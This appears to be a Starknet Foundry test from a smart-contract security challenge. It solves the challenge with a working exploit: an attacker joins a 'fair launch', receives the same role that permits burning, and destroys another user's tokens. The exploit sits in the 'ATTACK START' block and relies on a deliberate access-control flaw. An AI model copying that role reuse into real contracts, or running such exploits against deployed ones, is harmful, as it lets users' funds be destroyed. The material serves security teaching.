use starknet::{ContractAddress};
use snforge_std::{
    declare, ContractClassTrait, DeclareResultTrait,  
    start_cheat_caller_address, stop_cheat_caller_address
};
use openzeppelin::token::erc20::interface::{IERC20Dispatcher, IERC20DispatcherTrait};
use openzeppelin::access::ownable::interface::{IOwnableDispatcher, IOwnableDispatcherTrait};
use openzeppelin::access::accesscontrol::interface::{IAccessControlDispatcher, IAccessControlDispatcherTrait};

use access_control::unfair_launch::fair_launch::{
    IERC20MintingAndBurningDispatcher, IERC20MintingAndBurningDispatcherTrait, 
    IFairLaunchDispatcher, IFairLaunchDispatcherTrait
};
use access_control::utils::helpers::{deploy_eth, one_ether, mint_erc20};

const TOKEN_DECIMALS: u256 = 1000000; // 6 decimals

fn deploy_fair_launch(eth: ContractAddress) -> (
    ContractAddress, IERC20Dispatcher, IERC20MintingAndBurningDispatcher, IFairLaunchDispatcher
) {

    let contract_class = declare("FairLaunch").unwrap().contract_class();
    let mut data_to_constructor = Default::default();
    let deployer: ContractAddress = 123.try_into().unwrap();
    Serde::serialize(@deployer, ref data_to_constructor);
    Serde::serialize(@eth, ref data_to_constructor);
    let (address, _) = contract_class.deploy(@data_to_constructor).unwrap();

    return (
        address,
        IERC20Dispatcher { contract_address: address },
        IERC20MintingAndBurningDispatcher { contract_address: address },
        IFairLaunchDispatcher { contract_address: address }
    );
}

#[test]
fn test_access_control_4() {

    // Users
    let alice = 1.try_into().unwrap();
    let attacker: ContractAddress = 2.try_into().unwrap();
    let minter: ContractAddress = 123.try_into().unwrap();

    // Deployments
    let (eth_address, eth_dispatcher) = deploy_eth();
    let (
        token_address, token_dispatcher, 
        minting_dispatcher, fair_launch_dispatcher
    ) = deploy_fair_launch(eth_address);

    //  0.1 ETH
    let amount = one_ether() / 10;

    // Alice and attacker both get 1 ETH
    mint_erc20(eth_address, alice, one_ether());
    mint_erc20(eth_address, attacker, one_ether());

    // Alice approves the fair launch contract to spend 0.1 ETH
    start_cheat_caller_address(eth_address, alice);
    eth_dispatcher.approve(token_address, amount);
    stop_cheat_caller_address(eth_address);

    // Alice pays participates in the launch
    start_cheat_caller_address(token_address, alice);
    fair_launch_dispatcher.participate(amount);
    stop_cheat_caller_address(token_address);

    // The project mints the new tokens after the launch to Alice
    start_cheat_caller_address(token_address, minter);
    minting_dispatcher.mint(alice, 1000 * TOKEN_DECIMALS);
    stop_cheat_caller_address(token_address);

    assert(token_dispatcher.balance_of(alice) == 1000 * TOKEN_DECIMALS, 'Wrong balance');

    // TODO: Burn all the USDT tokens that Alice owns
    // ATTACK START //
    // Attacker approves the fair launch contract to spend 0.1 ETH
    start_cheat_caller_address(eth_address, attacker);
    eth_dispatcher.approve(token_address, amount);
    stop_cheat_caller_address(eth_address);

    // Only used to check if attacker has role
    let _burner_role = selector!("BURNER_ROLE");
    let _access_dispatcher = IAccessControlDispatcher { contract_address: token_address };
    
    // println!("attacker has burner role before: {}", access_dispatcher.has_role(burner_role, attacker));

    // Attacker pays to participate in the launch
    // Attacker noticed the role being granted to participate
    // is the same role as the one necessary to burn tokens
    // Alice pays participates in the launch
    start_cheat_caller_address(token_address, attacker);
    fair_launch_dispatcher.participate(amount);
    stop_cheat_caller_address(token_address);

    // The project mints the new tokens after the launch to attacker
    //start_cheat_caller_address(token_address, minter);
    //minting_dispatcher.mint(attacker, 1000 * TOKEN_DECIMALS);
    //stop_cheat_caller_address(token_address);

    // Attacker burns all the tokens Alice owns
    start_cheat_caller_address(token_address, attacker);
    minting_dispatcher.burn(alice, 1000 * TOKEN_DECIMALS);
    stop_cheat_caller_address(token_address);

    // ATTACK END //

    // Alice should have 0 USDT tokens even though she particpated in the launch
    assert(token_dispatcher.balance_of(alice) == 0, 'Wrong balance');
}

